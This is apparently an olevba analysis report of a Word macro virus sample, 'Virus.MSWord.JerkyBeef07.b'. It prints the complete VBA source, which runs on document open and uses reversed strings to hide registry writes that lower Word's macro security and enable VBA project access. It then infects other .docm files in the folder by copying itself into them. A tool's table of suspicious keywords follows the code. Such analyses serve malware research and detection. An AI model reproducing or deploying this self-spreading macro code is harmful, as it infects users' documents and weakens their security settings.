olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.JerkyBeef07.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.JerkyBeef07.b - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
'Word2007.BeefJerky
'(c)Necronomikon[Doomriderz]
'only .docm files can be infected as normal docx files can not contain macro code.
'to run correctly this code must be saved in a .docm macro-enabled word document
'in the "ThisDocument" module. Enjoy^^

StrReverse ("llehs Mid")
StrReverse ("1 = eludom :regetnI sA eludom miD")
StrReverse ("1 = enil :regetnI sA enil miD")
StrReverse ("gnirtS sA edocriv miD")
StrReverse ("""mcod."" = txE_eliF :gnirtS sA txE_eliF miD")
StrReverse ("))""tcejbOmetsySeliF."" + ""gnitpircS""((tcejbOetaerC = osf teS")
StrReverse ("))""llehS."" + ""tpircSW""((tcejbOetaerC = llehs teS")
StrReverse ("noisreV.noitacilppA esaC tceleS")
StrReverse ("""0.21"" esaC")
StrReverse ("""\ytiruceS\droW\0.21\eciffO\tfosorciM\erawtfoS\UCKH"" = htaPgeR")
StrReverse ("""DROWD_GER"" ,1 ,""leveL"" & htaPgeR etirWgeR.llehs")
StrReverse ("""DROWD_GER"" ,1 ,""MOBVsseccA"" & htaPgeR etirWgeR.llehs")
StrReverse ("""0.11"" esaC")
StrReverse ("dnE")
StrReverse ("""0.01"" esaC")
StrReverse ("dnE")
StrReverse ("""0.9"" esaC")
StrReverse ("dnE")
StrReverse ("""0.8"" esaC")
StrReverse ("dnE")
StrReverse ("tceleS dnE")
StrReverse ("_ .)eludom(stnenopmoCBV.tcejorPBV.tnemucoDevitcA = edocriv")
StrReverse ("_ .)eludom(stnenopmoCBV.tcejorPBV.tnemucoDevitcA ,enil(seniL.eludoMedoC")
StrReverse (")seniLfOtnuoC.eludoMedoC")
StrReverse ("seliF.)"".""(redlofteg.osf nI emaNeliF hcaE roF")
StrReverse ("nehT emaN.tnemucoDevitcA & ""\"" & )"".""(redlofteg.osf >< emaNeliF fI")
StrReverse ("nehT )txE_eliF ,emaNeliF(rtSnI fI")
StrReverse (")emaNeliF( nepO.stnemucoD")
StrReverse ("_ .)eludom(stnenopmoCBV.tcejorPBV.tnemucoDevitcA.droW fI")
StrReverse ("nehT "")(nepO_tnemucoD buS etavirP"" >< )enil ,enil(seniL.eludoMedoC")
StrReverse ("_ .)eludom(metI.stnenopmoCBV.tcejorPBV.tnemucoDevitcA.droW")
StrReverse ("edocriv ,enil seniLtresnI.eludoMedoC")
StrReverse ("fI dnE")
StrReverse ("evaS.tnemucoDevitcA.droW")
StrReverse ("esolC.tnemucoDevitcA.droW")
StrReverse ("fI dnE")
StrReverse ("fI dnE")
StrReverse ("txeN")
End Sub


+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

